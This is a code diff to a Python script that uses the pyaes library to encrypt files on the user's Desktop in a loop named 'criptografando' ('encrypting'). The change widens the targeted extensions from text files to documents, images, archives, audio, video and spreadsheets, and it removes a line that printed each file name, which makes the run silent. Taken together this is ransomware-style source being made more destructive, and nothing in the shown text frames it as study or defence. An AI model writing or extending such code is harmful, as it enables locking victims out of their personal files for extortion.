@@ -3,7 +3,7 @@ import glob
 import time
 import pyaes
 from pathlib import Path
-filename_filter = ["*.txt"]
+filename_filter = ["*.txt","*.docs","*.doc","*.pdf","*.ppt","*.jpeg","*.jpg","*.png","*.eps","*.psd","*.cdr","*.ai","*.docx","*.odt","*.rtf","*.html","*.epub","*.zip","*.rar","*mp3","*mp4","*.xls","*.xlsx"]
 base_path=Path.home()
 y = Path.home() / "Desktop"
 os.chdir(y)
@@ -45,7 +45,6 @@ def txt():
 def criptografando():
     for files in filename_filter:
         for format_file in glob.glob(files):
-            print(format_file)
             f = open(f'{desktop}\\{format_file}', 'rb')
             file_data = f.read()
             f.close()
